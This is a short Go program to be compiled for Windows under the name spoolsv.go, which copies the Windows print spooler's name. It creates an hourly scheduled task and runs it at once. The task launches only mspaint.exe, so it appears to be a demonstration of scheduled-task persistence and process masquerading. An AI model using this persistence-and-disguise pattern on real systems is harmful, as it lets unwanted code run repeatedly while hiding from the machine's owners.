package main
import(
	"os/exec"
)

//Compile with: env GOOS=windows GOARCH=386 go build spoolsv.go

func main(){

	c := exec.Command("schtasks", "/create", "/tn","start", "/tr","mspaint.exe", "/sc","hourly", "/f")
	d := exec.Command("schtasks", "/run", "/tn","start")
 
	c.Start()
	d.Start()

}       
